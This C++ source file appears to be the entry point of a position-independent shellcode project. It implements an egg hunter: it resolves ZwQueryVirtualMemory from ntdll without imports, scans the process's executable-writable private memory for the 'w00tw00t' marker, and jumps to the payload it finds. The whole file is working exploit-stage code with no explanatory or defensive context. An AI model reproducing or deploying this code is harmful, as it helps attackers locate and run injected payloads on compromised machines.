#include "stdafx.h"

//#define _PRINT_CPP_NAMES_
#include "../ScEntry/address.h"

FARPROC FindEgg(SIZE_T RegionSize, PVOID BaseAddress, ULONG64 marker)ASM_FUNCTION;

PVOID GetNtBase();

PVOID __fastcall GetFuncAddressEx(PIMAGE_DOS_HEADER pidh, PCSTR ProcedureName);

void WINAPI ep()
{
	CPP_FUNCTION;

	union {
		PVOID pfn;
		NTSTATUS (NTAPI * QueryVirtualMemory)(
				_In_ HANDLE ProcessHandle,
				_In_opt_ PVOID BaseAddress,
				_In_ MEMORY_INFORMATION_CLASS MemoryInformationClass,
				_Out_writes_bytes_(MemoryInformationLength) PVOID MemoryInformation,
				_In_ SIZE_T MemoryInformationLength,
				_Out_opt_ PSIZE_T ReturnLength
			);
	};

	if (pfn = GetFuncAddressEx((PIMAGE_DOS_HEADER)GetNtBase(), "ZwQueryVirtualMemory"))
	{
		MEMORY_BASIC_INFORMATION mbi{};
		while (0 <= QueryVirtualMemory(NtCurrentProcess(), mbi.BaseAddress, MemoryBasicInformation, &mbi, sizeof(mbi), 0))
		{
			if (MEM_COMMIT == mbi.State && MEM_PRIVATE == mbi.Type && PAGE_EXECUTE_READWRITE == mbi.Protect)
			{
				if (SIZE_T RegionSize = mbi.RegionSize / sizeof(ULONG64))
				{
					if (FARPROC func = FindEgg(RegionSize, mbi.BaseAddress, 0x7730307477303074))
					{
						func();
						break;
					}
				}
				else
				{
					break;
				}
			}

			(ULONG_PTR&)mbi.BaseAddress += mbi.RegionSize;
		}
	}
}